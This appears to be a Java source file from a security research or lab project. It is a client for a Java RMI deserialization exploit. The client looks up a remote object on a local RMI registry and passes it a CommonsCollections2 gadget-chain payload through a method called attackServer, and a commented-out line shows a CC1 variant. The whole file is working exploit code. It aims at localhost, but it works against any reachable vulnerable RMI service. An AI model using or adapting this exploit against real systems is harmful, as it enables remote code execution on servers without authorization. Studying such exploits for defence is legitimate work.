package nth347.exploits;

import javassist.CannotCompileException;
import javassist.NotFoundException;
import nth347.common.RMIInterface;
import nth347.payloads.CommonsCollections2;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIDeserializationExploit {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException, NotBoundException, NotFoundException, CannotCompileException, NoSuchFieldException {
        /*
        RMIInterface rmiInterface = (RMIInterface) Naming.lookup("rmi://127.0.0.1:1099/RMI");
        rmiInterface.attackServer(PayloadFactory.getPayload("CC1"));
         */

        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RMIInterface rmiInterface = (RMIInterface) registry.lookup("RMI");
        rmiInterface.attackServer(CommonsCollections2.getPayload());
    }
}
